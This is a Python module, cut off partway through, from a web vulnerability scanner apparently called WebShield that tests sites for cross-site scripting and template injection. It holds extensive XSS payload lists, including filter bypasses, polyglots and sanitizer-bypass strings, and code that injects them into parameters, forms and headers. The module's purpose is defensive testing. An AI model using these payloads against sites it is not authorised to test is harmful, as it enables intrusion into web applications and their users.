"""
Cross-Site Scripting (XSS) Scanner
Covers: reflected XSS (canary-first), DOM-based, stored-indicator, form XSS,
        context-aware payloads, filter bypasses, polyglots, mXSS hints,
        template injection (SSTI) probes, JSON/API XSS, CSP weakness flagging.
"""
# ╔══════════════════════════════════════════════════════════════════════════╗
# ║  WebShield — Advanced Web Application Security Scanner                  ║
# ║  Copyright (c) 2026 علاء محمود البدوي (Alaa Mahmoud El-Badawi)         ║
# ║  All rights reserved. For authorized security research only.            ║
# ╚══════════════════════════════════════════════════════════════════════════╝

from __future__ import annotations

import hashlib
import re
import time
from typing import Any, Dict, List, Optional, Tuple

from .base_scanner import BaseScanner
try:
    from ..recon.intelligence_bridge import IntelligenceAwareScanner as _ScannerBase
except Exception:
    _ScannerBase = BaseScanner
from ..core.http_client import HTTPResponse
from ..models.vulnerability import (
    Vulnerability,
    VulnType,
    Severity,
    CVSSv3,
    AttackVector,
    AttackComplexity,
    PrivilegesRequired,
    UserInteraction,
    Scope,
    Impact,
)
# Phase 4.5 — reflection tracking for smarter context-aware payloads
from ..utils.reflection_tracker import ReflectionTracker, ReflectionContext, Transformation
try:
    from ..utils.payloads import XSS_FILTER_BYPASS as _XSS_BYPASS
except ImportError:
    _XSS_BYPASS: List[str] = []

# ---------------------------------------------------------------------------
# CVSS profiles for XSS sub-types
# ---------------------------------------------------------------------------

_CVSS_XSS_REFLECTED = CVSSv3(
    attack_vector=AttackVector.NETWORK,
    attack_complexity=AttackComplexity.LOW,
    privileges_required=PrivilegesRequired.NONE,
    user_interaction=UserInteraction.REQUIRED,
    scope=Scope.CHANGED,
    confidentiality=Impact.LOW,
    integrity=Impact.LOW,
    availability=Impact.NONE,
)

_CVSS_XSS_DOM = CVSSv3(
    attack_vector=AttackVector.NETWORK,
    attack_complexity=AttackComplexity.HIGH,
    privileges_required=PrivilegesRequired.NONE,
    user_interaction=UserInteraction.REQUIRED,
    scope=Scope.CHANGED,
    confidentiality=Impact.LOW,
    integrity=Impact.LOW,
    availability=Impact.NONE,
)

_CVSS_SSTI = CVSSv3(
    attack_vector=AttackVector.NETWORK,
    attack_complexity=AttackComplexity.LOW,
    privileges_required=PrivilegesRequired.NONE,
    user_interaction=UserInteraction.NONE,
    scope=Scope.CHANGED,
    confidentiality=Impact.HIGH,
    integrity=Impact.HIGH,
    availability=Impact.HIGH,
)

# ---------------------------------------------------------------------------
# Shared references
# ---------------------------------------------------------------------------

_XSS_REFS = [
    "https://owasp.org/www-community/attacks/xss/",
    "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
    "https://cwe.mitre.org/data/definitions/79.html",
    "https://portswigger.net/web-security/cross-site-scripting",
]

_OWASP_INJ = "A03:2021 - Injection"
_CWE_79 = "CWE-79"

# ---------------------------------------------------------------------------
# HTML-entity detection helpers
# ---------------------------------------------------------------------------

# Any of these entities near a reflection point means the output IS escaped.
_ENTITY_RE = re.compile(r"&(?:lt|gt|quot|apos|amp|#\d+|#x[0-9a-fA-F]+);", re.IGNORECASE)

# Dangerous characters whose presence unescaped confirms XSS risk.
_DANGEROUS_CHARS = ("<", ">", "'", '"', "`")


# ---------------------------------------------------------------------------
# Canary generation
# ---------------------------------------------------------------------------

def _make_canary(param: str) -> str:
    """
    Generate a unique, collision-resistant 8-char alphanumeric canary per
    parameter.  The tag format ``<wsXXXXXXXX>`` is legal enough to pass many
    WAF allow-lists while being trivially detectable in the response.
    """
    ts = str(time.monotonic_ns())
    h = hashlib.md5(f"{param}{ts}".encode(), usedforsecurity=False).hexdigest()[:8]
    return f"ws{h}"          # e.g.  wsab12cd34


# ---------------------------------------------------------------------------
# Injection-context detection
# ---------------------------------------------------------------------------

class _InjectionContext:
    HTML_ATTR    = "html_attribute"
    SCRIPT       = "script_block"
    HTML_COMMENT = "html_comment"
    CSS          = "css_style"
    URL_ATTR     = "url_attribute"
    JSON_BODY    = "json_body"
    HTML_TEXT    = "html_text"      # bare HTML content / fallback


def _detect_context(canary: str, body: str) -> str:
    """
    Locate the first occurrence of *canary* in *body* and classify the
    surrounding context.  Returns one of the _InjectionContext constants.
    """
    idx = body.find(canary)
    if idx == -1:
        return _InjectionContext.HTML_TEXT

    # Inspect up to 300 chars of context before and after the injection point.
    window_start = max(0, idx - 300)
    window_end   = min(len(body), idx + len(canary) + 300)
    before = body[window_start:idx]
    after  = body[idx + len(canary): window_end]

    # ----- JSON body -----
    ct_hint = body[:200].lower()
    if '"' + canary + '"' in body or (":{" in before[-20:]) or (before.rstrip()[-1:] in ('"', ":")):
        # Cheap heuristic: if the canary is wrapped in double-quotes and surrounded
        # by JSON-like punctuation, treat it as JSON context.
        if re.search(r'[{,\[]\s*"[^"]*":\s*"?' + re.escape(canary), body[:idx + len(canary) + 5]):
            return _InjectionContext.JSON_BODY

    # ----- Inside <script> … </script> -----
    # Walk backwards to find the most recent opening tag type.
    last_script_open  = before.rfind("<script")
    last_script_close = before.rfind("</script")
    if last_script_open > last_script_close and last_script_open != -1:
        return _InjectionContext.SCRIPT

    # ----- Inside HTML comment -----
    last_comment_open  = before.rfind("<!--")
    last_comment_close = before.rfind("-->")
    if last_comment_open > last_comment_close and last_comment_open != -1:
        return _InjectionContext.HTML_COMMENT

    # ----- Inside <style> … </style> -----
    last_style_open  = before.rfind("<style")
    last_style_close = before.rfind("</style")
    if last_style_open > last_style_close and last_style_open != -1:
        return _InjectionContext.CSS

    # ----- Inside an HTML attribute -----
    # Look for  attr="…CANARY  or  attr='…CANARY  or  href=…CANARY
    url_attr_re = re.compile(
        r'(?:href|src|action|formaction|data|poster|background)\s*=\s*["\']?[^"\'>\s]*$',
        re.IGNORECASE,
    )
    if url_attr_re.search(before):
        return _InjectionContext.URL_ATTR

    attr_re = re.compile(r'<[a-zA-Z][^>]*\s+[a-zA-Z][a-zA-Z0-9_\-]*\s*=\s*["\'][^"\']*$', re.IGNORECASE)
    if attr_re.search(before):
        return _InjectionContext.HTML_ATTR

    # Unquoted attribute value: tag opened, whitespace, then bare value up to canary
    unquoted_re = re.compile(r'<[a-zA-Z][^>]*\s+[a-zA-Z][a-zA-Z0-9_\-]*\s*=\s*[^\s"\'<>]*$', re.IGNORECASE)
    if unquoted_re.search(before):
        return _InjectionContext.HTML_ATTR

    return _InjectionContext.HTML_TEXT


# ---------------------------------------------------------------------------
# Context-aware payload tables
# ---------------------------------------------------------------------------

# HTML-text / generic context
_PAYLOADS_HTML_TEXT: List[str] = [
    "<script>alert(1)</script>",
    "<script>alert(document.domain)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<iframe srcdoc=\"<script>alert(1)</script>\">",
    "<object data=javascript:alert(1)>",
]

# HTML attribute context  value="...INJECT..."
_PAYLOADS_HTML_ATTR: List[str] = [
    '" onmouseover="alert(1)" x="',
    "' onmouseover='alert(1)' x='",
    '" onfocus="alert(1)" autofocus x="',
    "' onfocus='alert(1)' autofocus x='",
    '" onload="alert(1)" x="',
    '"><script>alert(1)</script><"',
    "'><script>alert(1)</script><'",
    '" onerror="alert(1)" src="x" x="',
    # Unquoted attr break
    " onmouseover=alert(1) x=",
    '" style="expression(alert(1))" x="',
]

# Script-block context   var x = "...INJECT..."
_PAYLOADS_SCRIPT: List[str] = [
    '";alert(1);//',
    "';alert(1);//",
    "`};alert(1);//",
    "</script><script>alert(1)</script>",
    "</script><img src=x onerror=alert(1)>",
    '"-alert(1)-"',
    "'-alert(1)-'",
    "`-alert(1)-`",
    '\\";alert(1);//',
    # Template literal break
    "${alert(1)}",
    "#{alert(1)}",
]

# HTML comment context  <!-- ...INJECT... -->
_PAYLOADS_HTML_COMMENT: List[str] = [
    "--><script>alert(1)</script><!--",
    "--><img src=x onerror=alert(1)><!--",
    "--><svg onload=alert(1)><!--",
    "-- ><img src=x onerror=alert(1)><!-- ",
    "--> <details open ontoggle=alert(1)><!--",
]

# CSS / style block context
_PAYLOADS_CSS: List[str] = [
    "*/alert(1)/*",
    "</style><script>alert(1)</script><style>",
    '</style><img src=x onerror=alert(1)><style>',
    # IE-era expression (legacy, still worth flagging)
    "expression(alert(1))",
    "-moz-binding:url('data:text/xml,<bindings xmlns=\"http://www.mozilla.org/xbl\"><binding id=\"x\"><implementation><constructor>alert(1)</constructor></implementation></binding></bindings>')",
]

# URL attribute context  href="...INJECT..."  src="...INJECT..."
_PAYLOADS_URL_ATTR: List[str] = [
    "javascript:alert(1)",
    "javascript:alert(document.domain)",
    "javascript://comment%0aalert(1)",
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "vbscript:alert(1)",
    "JaVaScRiPt:alert(1)",
    "\x00javascript:alert(1)",
]

# JSON body context
_PAYLOADS_JSON: List[str] = [
    '"><script>alert(1)</script>',
    "'><svg onload=alert(1)>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
]

_CONTEXT_PAYLOADS: Dict[str, List[str]] = {
    _InjectionContext.HTML_TEXT:    _PAYLOADS_HTML_TEXT,
    _InjectionContext.HTML_ATTR:    _PAYLOADS_HTML_ATTR,
    _InjectionContext.SCRIPT:       _PAYLOADS_SCRIPT,
    _InjectionContext.HTML_COMMENT: _PAYLOADS_HTML_COMMENT,
    _InjectionContext.CSS:          _PAYLOADS_CSS,
    _InjectionContext.URL_ATTR:     _PAYLOADS_URL_ATTR,
    _InjectionContext.JSON_BODY:    _PAYLOADS_JSON,
}


# ---------------------------------------------------------------------------
# Filter-bypass payloads (context-agnostic; attempted after context payloads)
# ---------------------------------------------------------------------------

_PAYLOADS_FILTER_BYPASS: List[str] = [
    # Case mixing
    "<ScRiPt>alert(1)</sCrIpT>",
    "<SCRIPT>alert(1)</SCRIPT>",
    # HTML entities in JS
    "<img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\">",
    # Unicode escapes
    r"<img src=x onerror=eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')>",
    # JS string escape
    r'<img src=x onerror=eval("\x61\x6c\x65\x72\x74\x28\x31\x29")>',
    # Base64 eval
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    # Template literals
    "<svg onload=alert`${document.domain}`>",
    # Null-byte injection
    "<scr\x00ipt>alert(1)</scr\x00ipt>",
    "<img src=x onerror\x00=alert(1)>",
    # Whitespace variants
    "<svg\tonload=alert(1)>",
    "<svg\nonload=alert(1)>",
    "<svg\r\nonload=alert(1)>",
    # Double-encoding
    "%3cscript%3ealert(1)%3c%2fscript%3e",
    "%253cscript%253ealert(1)%253c%252fscript%253e",
    # Comment break
    "<script>al/**/ert(1)</script>",
    "<script>al\u0000ert(1)</script>",
    # Event without quotes
    '<img src=x onerror=alert(1)>',
    # Self-closing SVG
    '<svg><script>alert(1)</script></svg>',
    # fromCharCode
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    # JSFuck-style (compact)
    "<script>[]['\x66\x69\x6c\x74\x65\x72']['\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72']('alert(1)')()</script>",
    # Math-ML namespace trick
    "<math><mtext></mtext><mglyph><svg><mtext><style><path id=\"</style><img onerror=alert(1) src>\">",
]


# ---------------------------------------------------------------------------
# Polyglot payloads — work across multiple contexts
# ---------------------------------------------------------------------------

_PAYLOADS_POLYGLOT: List[str] = [
    # Classic polyglot (works in HTML text, attributes, script strings)
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e",
    # Attribute + script break
    '\'"--><script>alert(1)</script>',
    # Attr + HTML break
    '"><img src=x onerror=alert(1)><"',
    # Script + comment break
    "'</script><script>alert(1)//",
    # Universal: attr, html, JS, CSS
    '--></style></script><img src=x onerror=alert(1)><!--<style>/*<script>/*',
]


# ---------------------------------------------------------------------------
# Mutation XSS (mXSS) hint patterns
# ---------------------------------------------------------------------------

_MXSS_PAYLOADS: List[str] = [
    # DOMPurify bypass pattern (CVE-2019-25153 era)
    "<form><math><mtext></form><form><mglyph><svg><mtext><style><path id=\"</style><img onerror=alert(1) src>\">",
    # Nested namespace mutation
    "<svg><![CDATA[</svg><script>alert(1)</script>]]>",
    # noscript mutation
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
    # style + comment trick
    "<style><!--</style><script>alert(1)//--></script>",
]


# ---------------------------------------------------------------------------
# Template / SSTI probe payloads
# ---------------------------------------------------------------------------

_SSTI_PROBES: List[Tuple[str, str]] = [
    # (probe, expected_result)
    ("{{7*7}}",    "49"),
    ("${7*7}",     "49"),
    ("<%= 7*7 %>", "49"),
    ("#{7*7}",     "49"),
    ("{{7*'7'}}",  "7777777"),   # Jinja2 distinguishes int vs str multiply
    ("*{7*7}",     "49"),        # Spring EL
]


# ---------------------------------------------------------------------------
# DOM XSS sinks & sources
# ---------------------------------------------------------------------------

# Sinks: dangerous functions/properties that can execute or inject HTML/JS
_DOM_SINKS: List[str] = [
    "document.write(",
    "document.writeln(",
    "innerHTML",
    "outerHTML",
    "insertAdjacentHTML",
    "eval(",
    "setTimeout(",
    "setInterval(",
    "Function(",
    "execScript(",
    "document.location",
    "location.href",
    "location.replace(",
    "location.assign(",
    "window.location",
    "document.location.href",
    "document.location.replace",
    "document.location.assign",
    "src=",           # dynamic script/img src assignment in JS
]

# Sources: attacker-controllable data entering the DOM pipeline
_DOM_SOURCES: List[str] = [
    "location.hash",
    "location.search",
    "location.href",
    "document.URL",
    "document.documentURI",
    "document.baseURI",
    "document.referrer",
    "window.name",
    "postMessage",
    "URLSearchParams",
    "decodeURIComponent",
    "atob(",           # often used to decode attacker-supplied b64
]

# Source patterns that indicate a sink is *reading* from the source
_DOM_SOURCE_PATTERNS: List[re.Pattern] = [
    re.compile(r"location\s*[.[]?\s*(hash|search|href|pathname)", re.I),
    re.compile(r"document\s*\.\s*(URL|documentURI|baseURI|referrer)", re.I),
    re.compile(r"window\s*\.\s*name", re.I),
    re.compile(r"addEventListener\s*\(\s*['\"]message['\"]", re.I),
    re.compile(r"URLSearchParams\s*\(", re.I),
]


# ---------------------------------------------------------------------------
# CSP weakness patterns
# ---------------------------------------------------------------------------

_CSP_UNSAFE_RE = re.compile(
    r"(unsafe-inline|unsafe-eval|\*|data:|blob:|'nonce-[^']+'\s*(?!.*strict-dynamic))",
    re.IGNORECASE,
)


# ---------------------------------------------------------------------------
# Main scanner class
# ---------------------------------------------------------------------------

class XSSScanner(_ScannerBase):
    """
    Professional-grade Cross-Site Scripting scanner.

    Detection pipeline per URL/parameter:
      1. Canary reflection probe  → confirms raw reflection
      2. Context detection        → identifies injection context
      3. Context-appropriate payloads
      4. Filter-bypass payloads
      5. Polyglots
      6. mXSS hints
      7. SSTI probes
      8. DOM XSS static analysis (sinks + sources)
      9. Form XSS (all input types including hidden / textarea / select)
     10. JSON/API XSS
     11. CSP weakness flagging
    """

    name = "XSS"

    # ------------------------------------------------------------------
    # Entry point
    # ------------------------------------------------------------------

    async def scan_url(
        self,
        url: str,
        response: HTTPResponse,
        forms: List[Dict[str, Any]],
    ) -> List[Vulnerability]:
        vulns: List[Vulnerability] = []
        seen: set = set()       # de-duplicate by (url, param, payload)

        params = self._extract_url_params(url)

        # URL-parameter reflected XSS
        for param in params:
            for v in await self._test_reflected_xss(url, param, "GET"):
                key = (v.url, v.parameter, v.payload)
                if key not in seen:
                    seen.add(key)
                    vulns.append(v)

        # Form XSS
        for form in forms:
            for inp in form.get("inputs", []):
                name = inp.get("name", "")
                if not name:
                    continue
                inp_type = (inp.get("type") or "text").lower()
                # Include hidden fields — override their value
                if inp_type in ("submit", "button", "image", "file", "reset"):
                    continue
                action = form.get("action") or url
                method = (form.get("method") or "GET").upper()
                for v in await self._test_form_xss(action, method, form, name):
                    key = (v.url, v.parameter, v.payload)
                    if key not in seen:
                        seen.add(key)
                        vulns.append(v)

        # SSTI probes are handled by the dedicated SSTIScanner — removed from here
        # to prevent duplicate findings and wasted requests (Fix 2.3)

        # DOM XSS static analysis
        for v in self._check_dom_xss(url, response):
            vulns.append(v)

        # CSP weakness check
        v_csp = self._check_csp_weakness(url, response)
        if v_csp:
            vulns.append(v_csp)

        # HTTP Header XSS injection (Referer, User-Agent, X-Forwarded-For)
        for v in await self._test_header_xss(url):
            key = (v.url, v.parameter, v.payload)
            if key not in seen:
                seen.add(key)
                vulns.append(v)

        return vulns

    # ------------------------------------------------------------------
    # Reflected XSS — canary-first, context-aware
    # ------------------------------------------------------------------

    async def _test_reflected_xss(
        self,
        url: str,
        param: str,
        method: str,
    ) -> List[Vulnerability]:
        """
        Full reflected-XSS pipeline for a single URL parameter.

        Steps:
          1. Send canary ``<wsXXXXXXXX>`` — bail if no reflection.
          2. Verify canary reflects *unescaped* (not &lt;…&gt;).
          3. Detect injection context from canary position in response.
          4. Test context-appropriate payloads → immediate return on first hit.
          5. Test filter-bypass payloads.
          6. Test polyglots.
          7. Test mXSS hint patterns.
          8. If canary reflected but no payload confirmed → Medium confidence finding.
        """
        canary_tag = _make_canary(param)
        probe = f"<{canary_tag}>"
        injected_url = self._inject_param(url, param, probe)
        resp = await self.client.get(injected_url)

        if not resp:
            return []

        # ── Step 1: Does the canary appear at all? ──────────────────────────
        body = resp.text
        if probe not in body and canary_tag not in body:
            return []

        # ── Step 2: Is it unescaped? ─────────────────────────────────────────
        if not self._canary_unescaped(canary_tag, body):
            return []

        # ── Step 3: Context detection ─────────────────────────────────────────
        context = _detect_context(canary_tag, body)

        # ── Steps 4-7: Payload testing ────────────────────────────────────────
        context_payloads  = _CONTEXT_PAYLOADS.get(context, _PAYLOADS_HTML_TEXT)
        full_payload_list = (
            context_payloads
            + _PAYLOADS_FILTER_BYPASS
            + _PAYLOADS_POLYGLOT
            + _MXSS_PAYLOADS
        )

        for payload in full_payload_list:
            injected_url = self._inject_param(url, param, payload)
            xss_resp = await self.client.get(injected_url)
            if xss_resp and self._is_xss_unescaped(payload, xss_resp.text):
                return [self._build_vuln(
                    vuln_type=VulnType.XSS,
                    title=f"Reflected Cross-Site Scripting (XSS) [{context}]",
                    description=(
                        f"Parameter '{param}' reflects unsanitized input into the HTML response. "
                        f"Injection context: {context}. "
                        f"A unique canary '{canary_tag}' was confirmed unescaped, then the "
                        f"context-appropriate payload executed successfully. "
                        f"An attacker can craft a malicious URL that executes arbitrary JavaScript "
                        f"in the victim's browser, leading to session hijacking, credential theft, "
                        f"or defacement."
                    ),
                    url=url,
                    parameter=param,
                    payload=payload,
                    evidence=(
                        f"Canary '{canary_tag}' reflected unescaped (context: {context}); "
                        f"payload confirmed: {payload[:100]}"
                    ),
                    method=method,
                    remediation=(
                        "Apply context-sensitive output encoding: "
                        "HTML-encode for HTML content, JavaScript-encode for script context, "
                        "CSS-encode for style context, URL-encode for URL attributes. "
                        "Use framework auto-escaping (Jinja2, React JSX, Angular templates). "
                        "Deploy a strict Content-Security-Policy without 'unsafe-inline'. "
                        "Validate and sanitize all user input server-side."
                    ),
                    references=_XSS_REFS,
                    cwe_id=_CWE_79,
                    owasp_category=_OWASP_INJ,
                    response_snippet=self._snippet(xss_resp.text),
                    confidence="High",
                    cvss=_CVSS_XSS_REFLECTED,
                )]

        # ── Step 8: Canary only — Medium confidence ──────────────────────────
        # Phase 4.5: use ReflectionTracker to get smarter context details
        tracker = ReflectionTracker()
        track_result = tracker.track(canary=canary_tag, response_body=body)
        suggested = tracker.suggest_payloads(track_result)
        transform_info = (
            ", ".join(t.value for t in track_result.transformations)
            if track_result.transformations else "none"
        )

        return [self._build_vuln(
            vuln_type=VulnType.XSS,
            title=f"Reflected Input Without Encoding (Potential XSS) [{context}]",
            description=(
                f"Parameter '{param}' reflects raw user input (canary '{canary_tag}') "
                f"back into the HTML response without HTML encoding, in context: {context}. "
                f"No XSS payload was confirmed in automated testing, but the unencoded "
                f"reflection represents an exploitable surface that warrants manual review. "
                f"Reflection tracker transformations: {transform_info}. "
                f"Suggested manual payloads: {', '.join(suggested[:3]) if suggested else 'see context-aware list'}."
            ),
            url=url,
            parameter=param,
            payload=probe,
            evidence=f"Canary '{probe}' appeared unescaped in response (context: {context})",
            method=method,
            severity=Severity.MEDIUM,
            remediation=(
                "HTML-encode all user-controlled data before rendering it in responses. "
                "Apply context-appropriate escaping and adopt a Content-Security-Policy."
            ),
            references=_XSS_REFS,
            cwe_id=_CWE_79,
            owasp_category=_OWASP_INJ,
            response_snippet=self._snippet(body),
            confidence="Medium",
            cvss=_CVSS_XSS_REFLECTED,
        )]

    # ------------------------------------------------------------------
    # Form XSS — all input types
    # ------------------------------------------------------------------

    async def _test_form_xss(
        self,
        action: str,
        method: str,
        form: Dict[str, Any],
        param_name: str,
    ) -> List[Vulnerability]:
        """
        Test a single form field for XSS.  Supports text, password, email,
        number, textarea, select (override with payload), and hidden fields.

        Uses the same canary-first → context-detect → payload pipeline as
        _test_reflected_xss, but submits via the form's HTTP method.
        """
        canary_tag = _make_canary(param_name)
        probe = f"<{canary_tag}>"

        # Build baseline form data with the canary injected into target field
        def _build_form_data(value: str) -> Dict[str, str]:
            data: Dict[str, str] = {}
            for inp in form.get("inputs", []):
                n = inp.get("name", "")
                if not n:
                    continue
                if n == param_name:
                    data[n] = value
                else:
                    # Keep existing values; use safe fallbacks for empties
                    t = (inp.get("type") or "text").lower()
                    if t == "checkbox":
                        data[n] = "on"
                    elif t == "radio":
                        data[n] = inp.get("value", "1")
                    else:
                        data[n] = inp.get("value", "test")
            return data

        # ── Canary probe ───────────────────────────────────────────────────
        resp = await self._submit_form(action, method, _build_form_data(probe))
        if not resp:
            return []

        body = resp.text
        if probe not in body and canary_tag not in body:
            return []

        if not self._canary_unescaped(canary_tag, body):
            return []

        context = _detect_context(canary_tag, body)

        # ── Payload testing ────────────────────────────────────────────────
        context_payloads = _CONTEXT_PAYLOADS.get(context, _PAYLOADS_HTML_TEXT)
        full_payload_list = (
            context_payloads
            + _PAYLOADS_FILTER_BYPASS
            + _PAYLOADS_POLYGLOT
        )

        for payload in full_payload_list:
            xss_resp = await self._submit_form(action, method, _build_form_data(payload))
            if xss_resp and self._is_xss_unescaped(payload, xss_resp.text):
                return [self._build_vuln(
                    vuln_type=VulnType.XSS,
                    title=f"Reflected XSS in Form Field '{param_name}' [{context}]",
                    description=(
                        f"Form field '{param_name}' at {action} ({method}) reflects "
                        f"unsanitized input into the HTML response (context: {context}). "
                        f"Confirmed via canary '{canary_tag}'; "
                        f"XSS payload executed in automated test."
                    ),
                    url=action,
                    parameter=param_name,
                    payload=payload,
                    evidence=(
                        f"Canary unescaped in form response (context: {context}); "
                        f"payload confirmed: {payload[:100]}"
                    ),
                    method=method,
                    remediation=(
                        "Apply context-sensitive output encoding on all form field reflections. "
                        "Use framework-level auto-escaping. Deploy Content-Security-Policy. "
                        "Validate and sanitize all form inputs server-side."
                    ),
                    references=_XSS_REFS,
                    cwe_id=_CWE_79,
                    owasp_category=_OWASP_INJ,
                    response_snippet=self._snippet(xss_resp.text),
                    confidence="High",
                    cvss=_CVSS_XSS_REFLECTED,
                )]

        # Canary-only medium finding
        return [self._build_vuln(
            vuln_type=VulnType.XSS,
            title=f"Reflected Input Without Encoding in Form Field '{param_name}' [{context}]",
            description=(
                f"Form field '{param_name}' at {action} reflects raw input without encoding "
                f"(context: {context}). Canary '{canary_tag}' appeared unescaped. "
                f"No specific payload was confirmed — manual review recommended."
            ),
            url=action,
            parameter=param_name,
            payload=probe,
            evidence=f"Canary '{probe}' reflected unescaped in form response",
            method=method,
            severity=Severity.MEDIUM,
            remediation="Apply output encoding to all form field reflections.",
            references=_XSS_REFS,
            cwe_id=_CWE_79,
            owasp_category=_OWASP_INJ,
            response_snippet=self._snippet(body),
            confidence="Medium",
            cvss=_CVSS_XSS_REFLECTED,
        )]

    # ------------------------------------------------------------------
    # SSTI probes
    # ------------------------------------------------------------------

    async def _test_ssti(
        self,
        url: str,
        param: str,
        method: str,
    ) -> List[Vulnerability]:
        """
        Test for Server-Side Template Injection by injecting arithmetic probes.
        If the evaluated result (e.g., '49') appears in the response, flag as
        potential SSTI with MEDIUM severity.  Though technically separate from
        XSS, SSTI often leads to RCE and is surfaced here as an INFO/MEDIUM
        finding to keep all injection coverage in one pass.
        """
        findings: List[Vulnerability] = []
        for probe, expected in _SSTI_PROBES:
            injected_url = self._inject_param(url, param, probe)
            resp = await self.client.get(injected_url)
            if resp and expected in resp.text:
                # Sanity check: the expected value shouldn't already be in a
                # baseline response for this parameter.
                baseline_url = self._inject_param(url, param, "1")
                baseline = await self.client.get(baseline_url)
                if baseline and expected in baseline.text:
                    continue   # False positive — '49' present regardless

                findings.append(self._build_vuln(
                    vuln_type=VulnType.XSS,   # closest available; SSTI escalates to XSS/RCE
                    title="Potential Server-Side Template Injection (SSTI)",
                    description=(
                        f"Parameter '{param}' may be vulnerable to Server-Side Template Injection. "
                        f"The probe '{probe}' returned the evaluated result '{expected}' in the "
                        f"response, suggesting the input is being processed by a server-side "
                        f"template engine (Jinja2, Twig, Freemarker, Velocity, etc.). "
                        f"SSTI can escalate to Remote Code Execution in many frameworks."
                    ),
                    url=url,
                    parameter=param,
                    payload=probe,
                    evidence=f"Probe '{probe}' → result '{expected}' found in response",
                    method=method,
                    severity=Severity.MEDIUM,
                    remediation=(
                        "Never pass unsanitized user input directly into template rendering calls. "
                        "Use sandboxed template environments. "
                        "Prefer passing data as template variables, not as raw template strings. "
                        "Audit all template.render() / Environment.from_string() call sites."
                    ),
                    references=[
                        "https://portswigger.net/web-security/server-side-template-injection",
                        "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection",
                        "https://cwe.mitre.org/data/definitions/94.html",
                    ],
                    cwe_id="CWE-94",
                    owasp_category=_OWASP_INJ,
                    response_snippet=self._snippet(resp.text),
                    confidence="Medium",
                    cvss=_CVSS_SSTI,
                ))
                break   # One confirmed probe per parameter is sufficient
        return findings


    # ------------------------------------------------------------------
    # HTTP Header XSS injection
    # ------------------------------------------------------------------

    async def _test_header_xss(self, url: str) -> List[Vulnerability]:
        """
        Test HTTP request headers (Referer, User-Agent, X-Forwarded-For) for
        reflected XSS. Some applications echo these headers back unencoded in
        error pages, logs, or admin dashboards.
        """
        findings: List[Vulnerability] = []
        injectable_headers = [
            "Referer",
            "User-Agent",
            "X-Forwarded-For",
            "X-Forwarded-Host",
            "X-Original-URL",
        ]
        for hdr in injectable_headers:
            canary_tag = _make_canary(hdr)
            probe = f"<{canary_tag}>"
            resp = await self.client.get(url, headers={hdr: probe})
            if resp is None or not resp.is_text:
                continue
            body = resp.text
            if probe not in body and canary_tag not in body:
                continue
            if not self._canary_unescaped(canary_tag, body):
                continue
            # Canary reflected unescaped — try a real payload
            confirmed = False
            for payload in _PAYLOADS_HTML_TEXT[:5]:
                resp2 = await self.client.get(url, headers={hdr: payload})
                if resp2 and self._is_xss_unescaped(payload, resp2.text):
                    confirmed = True
                    findings.append(self._build_vuln(
                        vuln_type=VulnType.XSS,
                        title=f"Reflected XSS via HTTP Header ({hdr})",
                        description=(
                            f"The '{hdr}' HTTP request header is reflected unescaped in the response. "
                            f"Canary '{canary_tag}' appeared unescaped and the payload confirmed "
                            f"execution context. Exploitable when an attacker can control the header value "
                            f"(e.g. via a CSRF or referrer-based attack)."
                        ),
                        url=url,
                        parameter=f"Header: {hdr}",
                        payload=payload,
                        evidence=f"Header '{hdr}' → canary '{canary_tag}' unescaped in response",
                        method="GET",
                        severity=Severity.HIGH,
                        cvss=_CVSS_XSS_REFLECTED,
                        remediation=(
                            "Never echo HTTP request headers directly into responses without proper "
                            "HTML entity encoding. Apply output encoding at ALL header reflection points."
                        ),
                        references=_XSS_REFS,
                        cwe_id=_CWE_79,
                        owasp_category=_OWASP_INJ,
                        response_snippet=self._snippet(resp2.text),
                        confidence="High",
                    ))
                    break
            if not confirmed:
                findings.append(self._build_vuln(
                    vuln_type=VulnType.XSS,
                    title=f"Unencoded Header Reflection — Potential XSS ({hdr})",
                    description=(
                        f"The '{hdr}' header value is reflected in the response without HTML encoding. "
                        f"No XSS payload was automatically confirmed — manual verification recommended."
                    ),
                    url=url,
                    parameter=f"Header: {hdr}",
                    payload=probe,
                    evidence=f"Canary '{canary_tag}' reflected unescaped via header '{hdr}'",
                    method="GET",
                    severity=Severity.MEDIUM,
                    cvss=_CVSS_XSS_REFLECTED,
                    remediation="Apply HTML entity encoding to all header values before echoing in responses.",
                    references=_XSS_REFS,
                    cwe_id=_CWE_79,
                    owasp_category=_OWASP_INJ,
                    response_snippet=self._snippet(body),
                    confidence="Medium",
                ))
        return findings

    # ------------------------------------------------------------------
    # DOM XSS static analysis
    # ------------------------------------------------------------------

    def _check_dom_xss(
        self,
        url: str,
        response: HTTPResponse,
    ) -> List[Vulnerability]:
        """
        Heuristic static analysis of page JavaScript for dangerous DOM XSS
        patterns.  A finding is only raised when BOTH a dangerous sink AND a
        traceable attacker-controlled source are found in the same page source.

        Confidence: Low (static analysis, not confirmed exploit).
        """
        body = response.text

        found_sinks   = [s for s in _DOM_SINKS   if s in body]
        found_sources = [s for s in _DOM_SOURCES  if s in body]
        # Also check regex-based source patterns for more precise detection
        found_source_patterns = [
            p.pattern for p in _DOM_SOURCE_PATTERNS if p.search(body)
        ]
